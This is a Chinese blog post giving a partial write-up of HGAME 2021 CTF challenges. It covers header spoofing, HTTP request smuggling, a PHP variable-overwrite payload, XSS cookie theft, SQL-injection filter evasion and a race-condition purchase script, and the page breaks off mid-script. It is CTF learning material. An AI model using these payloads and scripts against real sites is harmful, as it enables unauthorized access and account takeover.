@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"casio-3.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="HGAME 2021 Writeup (部分)官方地址: https:&#x2F;&#x2F;hgame.vidar.club&#x2F; Week1Web Hitchhiking_in_the_Galaxy  Description 第一次在银河系里搭顺风车，要准备啥，在线等，挺急的  网址打开是一个 404 页面，下附一个可点击的链接：“我要搭顺风车！”， 用 Burp 抓一下，不出所料有一个 302 跳转，查看之，Tit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hgame2021">
+<meta property="og:url" content="https://casio-3.github.io/2021/02/01/hgame2021/index.html">
+<meta property="og:site_name" content="Where is your love?">
+<meta property="og:description" content="HGAME 2021 Writeup (部分)官方地址: https:&#x2F;&#x2F;hgame.vidar.club&#x2F; Week1Web Hitchhiking_in_the_Galaxy  Description 第一次在银河系里搭顺风车，要准备啥，在线等，挺急的  网址打开是一个 404 页面，下附一个可点击的链接：“我要搭顺风车！”， 用 Burp 抓一下，不出所料有一个 302 跳转，查看之，Tit">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-01-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-03-02T11:29:51.700Z">
+<meta property="article:author" content="Casio3">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://casio-3.github.io/2021/02/01/hgame2021/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>hgame2021 | Where is your love?</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"><a target="_blank" rel="noopener" href="https://github.com/Casio-3/" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#fff; color:#151513; position: absolute; top: 0; border: 0; left: 0; transform: scale(-1, 1);" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Where is your love?</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://casio-3.github.io/2021/02/01/hgame2021/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Casio3">
+      <meta itemprop="description" content="Little trix">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Where is your love?">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          hgame2021
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-02-01 00:00:00" itemprop="dateCreated datePublished" datetime="2021-02-01T00:00:00+08:00">2021-02-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-02 19:29:51" itemprop="dateModified" datetime="2021-03-02T19:29:51+08:00">2021-03-02</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="HGAME-2021-Writeup-部分"><a href="#HGAME-2021-Writeup-部分" class="headerlink" title="HGAME 2021 Writeup (部分)"></a>HGAME 2021 Writeup (部分)</h1><p>官方地址: <a target="_blank" rel="noopener" href="https://hgame.vidar.club/">https://hgame.vidar.club/</a></p>
+<h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><ul>
+<li><p><strong>Hitchhiking_in_the_Galaxy</strong></p>
+<blockquote>
+<p>Description</p>
+<p>第一次在银河系里搭顺风车，要准备啥，在线等，挺急的</p>
+</blockquote>
+<p>网址打开是一个 <strong>404</strong> 页面，下附一个可点击的链接：“我要搭顺风车！”，</p>
+<p>用 Burp 抓一下，不出所料有一个 <strong>302</strong> 跳转，查看之，Title 提示 <strong>405 Method Not Allowed</strong> ，</p>
+<p>遂改原 GET 方法为 POST 重新发包（此步之后到 Repeater 模块处操作），</p>
+<p>得响应：“<em>只有使用”无限非概率引擎”(Infinite Improbability Drive)才能访问这里～</em>”</p>
+<p>根据经验猜测修改 User-Agent 头，</p>
+<p>后续依次修改 Referer 头以及 X-Forwarded-For 头即得flag</p>
+</li>
+<li><p><strong>watermelon</strong></p>
+<blockquote>
+<p>Description</p>
+<p>简单且上头的游戏</p>
+</blockquote>
+<p>结合时事 “合成大西瓜”，此时网络上已经有众多源码分析，此题即考 js审计</p>
+<p>我搜索的字符串 is_number 啥的，使得每次合成的时候获得的分数剧增，然后玩一把到游戏结束检测到分数超过2000就弹flag</p>
+<p><strong>NOTE</strong>: chrome 系的 devtools 可以直接在 source 改 js 代码，然而 firefox 改不了，怪哉！</p>
+<p>官方wp上写的也可以查找 gameover</p>
+</li>
+<li><p><strong>宝藏走私者</strong></p>
+<blockquote>
+<p>Description</p>
+<p><strong>hint: 注意留意服务器信息</strong><br><strong>资料：<a target="_blank" rel="noopener" href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></strong><br>宝藏走私者 Switch 喜欢偷盗并将奇特的宝藏走私到一些黑市商家手中。<br>为了阻止其继续作恶，警探 Liki 奉命将 Switch 抓捕归案。<br>调查过程中，Liki 发现 Switch 将一个秘密藏在了一个私人服务器中。<br>这或许会成为后续追查 Switch 的重大线索，你能找到这个秘密吗？</p>
+</blockquote>
+<p>考察 http_smuggler，出题者后面直接 hint 给出学习资料了</p>
+<p>改 CL-TE 头偷鸡即可，（怀疑我是靠 Intruduer 模块上了别人的车。。。</p>
+</li>
+</ul>
+<a id="more"></a>
+
+<ul>
+<li><p><strong>智商检测鸡</strong></p>
+<blockquote>
+<p>Description</p>
+<p>又有谁不爱高数呢？反正我不爱（请使用firefox浏览器打开题目）</p>
+</blockquote>
+<p>100道题简单计算题，也有老哥是手算的。。</p>
+<p>正好这个寒假刚刚开始看 python，亦步亦趋学了下 requests 发包</p>
+<p>艰辛摸索过程不表</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://r4u.top:5000/&quot;</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.post(url + <span class="string">&#x27;api/verify&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    Q = session.get(url + <span class="string">&#x27;api/getQuestion&#x27;</span>)</span><br><span class="line">    num = re.findall(<span class="string">&#x27;(?&lt;=\&gt;)\d+(?=\&lt;)&#x27;</span>, Q.text)</span><br><span class="line">    </span><br><span class="line">    x = sympy.symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    below = -int(num[<span class="number">0</span>])</span><br><span class="line">    above = int(num[<span class="number">1</span>])</span><br><span class="line">    func = num[<span class="number">2</span>] + <span class="string">&#x27;*x+&#x27;</span> + num[<span class="number">3</span>]</span><br><span class="line">    ans = sympy.integrate(func, (x, below, above))</span><br><span class="line">    ans = <span class="string">&#x27;%.2f&#x27;</span> % ans</span><br><span class="line">    ans = str(ans)</span><br><span class="line">    print(<span class="string">&#x27;========================\n&#x27;</span> + ans)</span><br><span class="line">    </span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line">    body = &#123;<span class="string">&#x27;answer&#x27;</span>: ans&#125;</span><br><span class="line">    A=session.post(url=url + <span class="string">&#x27;api/verify&#x27;</span>, headers=headers, data=json.dumps(body))</span><br><span class="line">    </span><br><span class="line">    S = session.get(url + <span class="string">&#x27;api/getStatus&#x27;</span>)</span><br><span class="line">    print(session.cookies.get_dict())</span><br><span class="line">    print(S.text)</span><br><span class="line">flag = session.get(url + <span class="string">&#x27;api/getFlag&#x27;</span>)</span><br><span class="line">print(flag.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p><strong>走私者的愤怒</strong></p>
+<p>这道题是对 <strong>宝藏走私者</strong> 打的补丁，尽可能避免顺风车，考点相同</p>
+</li>
+</ul>
+<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><ul>
+<li><p><strong>Base全家福</strong></p>
+<blockquote>
+<p>Description</p>
+<p>新年即将来临之际，Base家族也团聚了，他们用他们特有的打招呼方式向你问了个好，你知道他们在说什么吗？ R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09</p>
+</blockquote>
+<p>Base64、Base32、Base16 依次解码</p>
+</li>
+<li><p><strong>不起眼的压缩包的养成的方法</strong></p>
+<blockquote>
+<p>Description</p>
+<p>0x4qE给了张图给我，说这图暗藏玄机，你能帮我找出来吗？</p>
+</blockquote>
+<p>图片可分离出压缩包，压缩包有注释（有的分离方式好像看不到）：</p>
+<p>”*Password is picture ID (Up to 8 digits)*“</p>
+<p><strong>AAPR</strong> 直接爆 8 位数字（官方wp说可以猜到是Pixiv ID）</p>
+<p>解压出来得到 <code>plain.zip</code>和<code>NO PASSWORD.txt</code>，打开<code>plain.zip</code>发现里面还有<code>NO PASSWORD.txt</code>，且大小与已解压的相同，猜测是明文攻击，根据 txt 内容 ：</p>
+<p>“*By the way, I only use storage.*”</p>
+<p>可推知压缩时采用 <u>仅存储</u>，然后用 <strong>AAPR</strong> 进行明文攻击，得 <code>flag.zip</code>，</p>
+<p>再由 txt 内容：</p>
+<p>“<em>Because it’s too strong or null. XD</em>”</p>
+<p>null 可能☞伪加密，010editor 查看改一下加密位即可解压，</p>
+<p>得一串 html 编码，解码得 flag</p>
+</li>
+<li><p><strong>Galaxy</strong></p>
+<blockquote>
+<p>Description</p>
+<p>Akira的信物：用于提升Akira的潜能。一张藏着秘密的星空壁纸，不幸的是似乎在某次行动中遗失了。</p>
+</blockquote>
+<p>附件后缀 <code>.pcapng</code>，使用 <strong>WireShark</strong> 做流量分析，可提取出一张星空图片</p>
+<p>本菜依次尝试图片隐写常见解法，最后试到 010editor 修改高度位发现隐于图片底部的 flag</p>
+<p>Nameless 解释是图片的 CRC32 校验不对，然后据此改为正确的长宽，而我就直接用 010editor的 png 模板随便把 height 改大了一点😅</p>
+</li>
+<li><p><font color="blue"><strong>Word RE:MASTER</strong></font></p>
+<blockquote>
+<p>Description</p>
+<p>timmix不知所踪，只留下了两个word文档，作为word专家的你能帮忙找出他的去向吗？</p>
+</blockquote>
+<p><code>first.docx</code> 解压，在得到的 word 文件夹里发现 <code>password.xml</code>，</p>
+<p>解里面的 brianfuck 代码可得第二个文档<code>maimai.docx</code> 的密码</p>
+<p>进入之后，需在 Word 的选项中开启显示隐藏文字，可看到一堆空白字符（制表、空格）</p>
+<blockquote>
+<p> 套路，也可根据密码：“DOYOUKNOWHIDDEN?” 猜测</p>
+</blockquote>
+<p>里面的图片在当时没想到思路，</p>
+<blockquote>
+<p> “喜欢！雪！这是真实的魔法！（卧槽！下雪了！牛逼阿！）”</p>
+</blockquote>
+<p>提示了 SNOW 隐写，当然有经验的可根据这一堆空白字符联想到</p>
+<p>SNOW 解码就出了</p>
+</li>
+</ul>
+<h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><h3 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h3><ul>
+<li><p><font color="blue"><strong>LazyDogR4U</strong></font></p>
+<blockquote>
+<p>Description</p>
+<p>懒狗R4u把Flag藏起来了，但由于他是懒狗，所以flag藏的很不安全。</p>
+</blockquote>
+<p>源码泄露 <strong>www.zip</strong>，由于经验不足，我去扫东方明珠塔了，被 ban 了一段时间 ip</p>
+<p>然而最后这道题卡了会儿，咕咕掉了</p>
+<p>照着官方的wp记录下</p>
+<p><code>flag.php</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] ===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;&lt;h3 style=&#x27;color: white&#x27;&gt;admin将于今日获取自己忠实flag&lt;/h3&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;&lt;h3 style=&#x27;color: white&#x27;&gt;<span class="subst">$flag</span>&lt;/h3&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>lazy.php</code>：将 <code>_GET</code> 、 <code>_POST</code> 传入的变量全部注册为普通变量，造成了变量覆盖</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filter= [<span class="string">&quot;SESSION&quot;</span>, <span class="string">&quot;SEVER&quot;</span>, <span class="string">&quot;COOKIE&quot;</span>, <span class="string">&quot;GLOBALS&quot;</span>];</span><br><span class="line"><span class="comment">// 直接注册所有变量，这样我就能少打字力，芜湖~</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>) <span class="keyword">as</span>$_request)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_requestas$_k=&gt;$_v)&#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($filteras$youBadBad)&#123;</span><br><span class="line">            $_k=str_replace($youBadBad, <span class="string">&#x27;&#x27;</span>, $_k);</span><br><span class="line">        &#125;</span><br><span class="line">        $&#123;$_k&#125; =$_v;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>考虑将 <code>_SESSION[&#39;username&#39;]</code> 覆盖为 <code>admin</code></p>
+<p>双写即可绕过这种替换为空的过滤方式</p>
+<p>以下出题人提示：</p>
+<p>传入数组的时候有个小小的坑，键名不可以加引号,可以自己尝试一下看看有什么不同。</p>
+<p>当传入的形式为 <code>?a[&#39;b&#39;]=1</code> 时，<code>$_GET</code> 数组为:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span> =&gt;  </span><br><span class="line">    	<span class="keyword">array</span> (size=<span class="number">1</span>) </span><br><span class="line">    		<span class="string">&#x27;&#x27;</span><span class="string">b&#x27;&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;1&#x27;</span> (length=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>payload:flag.php?_SESSESSIONSION[username]=admin</p>
+</blockquote>
+<p>题目里 <code>testuser</code> 帐号处还能够利用弱比较能够绕过密码登录，但是没什么用。</p>
+</li>
+<li><p><strong>Post to zuckonit</strong></p>
+<blockquote>
+<p>Description</p>
+<p>d1gg12 新学了HTML，一起来看看他写的在线博客吧！</p>
+</blockquote>
+<p>考的 XSS 基本过滤和绕过</p>
+<p>这题我偷懒了，用 <a href="xss.pt">XSS平台</a> 生成的代码一把梭上去拿到了cookie</p>
+<p>验证md5的脚本改了下别人的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">addStr = <span class="string">&#x27;&#x27;</span> <span class="comment">#addStr is not used in this problem</span></span><br><span class="line">knownMd5 = <span class="string">&#x27;4740b6&#x27;</span> <span class="comment">#Here to change your knownMd5</span></span><br><span class="line"></span><br><span class="line">dict = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">text</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(str(text).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dict:</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> dict:</span><br><span class="line">      <span class="keyword">for</span> k <span class="keyword">in</span> dict:</span><br><span class="line">          <span class="keyword">for</span> l <span class="keyword">in</span> dict:</span><br><span class="line">            x = i + k + j + l</span><br><span class="line">            b = x + addStr</span><br><span class="line">            codeMd5 = md5(b)</span><br><span class="line">            <span class="keyword">if</span> codeMd5[:<span class="number">6</span>] == knownMd5:</span><br><span class="line">                print(x)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><font color="blue"><strong>200OK!!</strong></font></p>
+<blockquote>
+<p>Description</p>
+<p><strong>hint: status 字段会有什么坏心思呢?</strong><br><strong>hint: 这些字符串存在哪里呢？变量？还是…？</strong><br>今天你 PTSD 了吗？</p>
+</blockquote>
+<p>太菜了，在 Status 字段手注到自闭也没打出来，黑盒着实难以整活</p>
+<p>PO 一下官方解析：</p>
+<p>看看 Network 发现 <code>/server.php</code></p>
+<p>测试后发现 Header 中的 <code>Status</code> 处可以注入</p>
+<p>过滤的字符串是<code>[&#39;select&#39;,&#39;SELECT&#39;,&#39;from&#39;,&#39;FROM&#39;,&#39;union&#39;,&#39;UNION&#39;,&#39;where&#39;,&#39;WHERE&#39;,&#39; &#39;]</code></p>
+<p>我们用 <code>/**/</code> 替代空格，然后大小写混合绕过过滤</p>
+</li>
+<li><p><strong>Liki的生日礼物</strong></p>
+<blockquote>
+<p>Description</p>
+<p>Liki生日快要到了，她想要一台switch，你能帮帮她么？</p>
+</blockquote>
+<p>钱差一点点买够的题，考条件竞争，多线程发包（但是我用 Burp 搞不定）</p>
+<p>学 Python 我也是咕咕人，搜索了一圈没有现成的脚本可以<em>借鉴</em>，</p>
+<p>一些类似题目调用 threading 库的看的很痛苦</p>
+<p>于是乎翻阅往期 hgame ，竟然真的找到一道可以偷师的题的脚本</p>
+<p>附上成品（终·多次雕琢·一键傻瓜式操作版）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, json</span><br><span class="line"><span class="keyword">import</span> threading, time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment">#注册随机用户</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line">    ran_name = <span class="string">&#x27;&#x27;</span>.join(random.sample(<span class="string">&#x27;Ca5io3AbcdefghIjklmnO&#x27;</span>,<span class="number">8</span>))</span><br><span class="line">    ran_password = <span class="string">&#x27;&#x27;</span>.join(random.sample(<span class="string">&#x27;Ca5io3AbcdefghIjklmnO&#x27;</span>,<span class="number">8</span>))</span><br><span class="line">    <span class="keyword">global</span> user</span><br><span class="line">    user = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: ran_name,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;Ca5io3&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.post(url=<span class="string">&quot;&#123;&#125;?m=register&quot;</span>.format(host),data=user)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;Register failed&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"><span class="comment">#这里把自己作到了，随机的时候加了!@-...这些字符，结果登录非法，偏偏我写的又是假的try，所以在money那里取数据的时候才报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#购买兑换券</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span>():</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;amount&quot;</span>: <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.post(url=<span class="string">&quot;&#123;&#125;?m=buy&quot;</span>.format(host),data=data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;Buy failed&quot;</span>)</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;https://birthday.liki.link/API/&quot;</span></span><br><span class="line">user = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;1919180&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1919180&quot;</span></span><br><span 